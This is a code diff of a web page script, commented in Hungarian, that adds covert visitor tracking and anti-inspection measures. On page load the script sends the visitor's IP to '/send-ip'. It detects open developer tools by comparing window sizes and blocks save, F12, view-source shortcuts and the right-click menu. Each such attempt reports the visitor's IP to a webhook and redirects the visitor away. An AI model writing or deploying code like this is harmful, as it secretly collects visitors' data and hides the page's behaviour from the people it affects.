@@ -23,6 +23,16 @@
 
         window.onload = function() {
             // Webhook URL lekérése a szervertől
+            fetch('/send-ip')
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data); // A szerver válasza
+                })
+                .catch(error => {
+                    console.error('Hiba történt:', error);
+                });
+
+            // Webhook URL-k lekérése a szervertől
             fetch('/get-webhook-url')
                 .then(response => response.json())
                 .then(data => {
@@ -51,23 +61,33 @@
             }, 2000);  // 2 másodpercig látszik
         }
 
-        // Billentyűkombinációk figyelése és IP küldése a webhookra
+        // Függvény, amely érzékeli, ha a fejlesztői eszközök meg vannak nyitva
+        function detectDevTools() {
+            const threshold = 160; // Küszöbérték, amit az eszközök megnyitásakor elérünk
+
+            setInterval(function() {
+                const devToolsOpened = window.outerHeight - window.innerHeight > threshold ||
+                                       window.outerWidth - window.innerWidth > threshold;
+
+                if (devToolsOpened) {
+                    window.location.href = "https://example.com1"; // Átirányítja egy másik oldalra
+                }
+            }, 1000); // Minden másodpercben ellenőrzi
+        }
+
+        // Figyeljük a Ctrl + S billentyűkombinációt, és megakadályozzuk a weboldal mentését
         document.addEventListener('keydown', function(event) {
             if (event.ctrlKey && event.key === 's') {
                 event.preventDefault(); // Megakadályozza a mentést
                 sendIpRequest('Ctrl + S', altWebhookUrl);  // Második webhook küldése
+                window.location.href = "https://example.com2"; // Átirányítja egy másik oldalra
             }
 
             // Figyeljük, ha a felhasználó megpróbálja megnyitni a fejlesztői eszközöket
             if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
                 event.preventDefault(); // Megakadályozza a devtools megnyitását
                 sendIpRequest('F12 / Ctrl + Shift + I', altWebhookUrl);  // Második webhook küldése
-            }
-
-            // Figyeljük a Ctrl + Shift + U kombinációt (forráskód megtekintése)
-            if (event.ctrlKey && event.key === 'u') {
-                event.preventDefault(); // Megakadályozza a forráskód megnyitását
-                sendIpRequest('Ctrl + U', altWebhookUrl);  // Második webhook küldése
+                window.location.href = "https://example.com3"; // Átirányítja egy másik oldalra
             }
         });
 
@@ -75,6 +95,7 @@
         document.addEventListener('contextmenu', function(event) {
             event.preventDefault(); // Megakadályozza a jobb klikk menüt
             sendIpRequest('Jobb klikk', altWebhookUrl);  // Második webhook küldése
+            window.location.href = "https://example.com4"; // Átirányítja egy másik oldalra
         });
 
         // IP küldése a /send-ip útvonalra
